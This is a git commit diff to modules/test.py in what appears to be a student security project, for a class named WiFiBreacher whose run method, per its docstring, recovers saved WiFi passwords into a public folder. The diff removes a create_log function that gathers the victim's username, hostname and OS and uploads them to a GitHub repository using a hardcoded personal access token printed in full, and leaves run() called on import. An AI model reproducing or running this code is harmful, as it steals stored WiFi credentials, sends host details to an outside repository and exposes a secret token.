29f6332081ce3fb2af28bdf41744d338329b352e
rsecurity12 <94355752+rsecurity12@users.noreply.github.com>
2023-05-26 12:10:05 +0200

    Update test.py

--- modules/test.py
+++ modules/test.py
@@ -4,36 +4,7 @@ class WiFiBreacher():
     
     def create_log(self,script_name,status):
         '''This function will create a log (succes/failed) depending on the script's results'''
-        import socket
-        import platform
-        import base64
-        import getpass
-        import datetime
-        from github import Github
-        import datetime
-        ACCESS_TOKEN ='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'
-        FOLDER_PATH ='logs'
-        current_datetime = datetime.datetime.now()
-        content = f"Script Name: {script_name}\nExecution time: {current_datetime}\nStatus: {status}\n\n"
-        username = getpass.getuser()
-        hostname = socket.gethostname()
-        os_name = platform.system()
-        filename = os_name + "_" + hostname + "_" + username
-        g = Github(ACCESS_TOKEN)
-        repo = g.get_repo("rsecurity12/python_opdracht")
-        
-        try:
-            existing_file = repo.get_contents(f"{FOLDER_PATH}/{filename}")
-            sha = existing_file.sha
-            existing_content = base64.b64decode(existing_file.content).decode()
-            new_content = existing_content + '\n' + content
-            repo.update_file(existing_file.path, "Update log", new_content, sha)
-        except Exception as e:
-            if 'Not Found' in str(e):
-                new_file = repo.create_file(f"{FOLDER_PATH}/{filename}", "New log", content)
-            else:
-                pass
-        
+      
     def run(self):
         '''This function will try to recover saved WiFi passwords and send its output to C: Users Public wifi_data'''
         import subprocess
@@ -62,8 +33,4 @@ class WiFiBreacher():
             pass
 
 wifi_breacher = WiFiBreacher("WiFiBreacher")
-try:
-    wifi_breacher.run()
-    wifi_breacher.create_log(wifi_breacher.script_name,"success")
-except:
-    wifi_breacher.create_log(wifi_breacher.script_name,"failed")
+wifi_breacher.run()
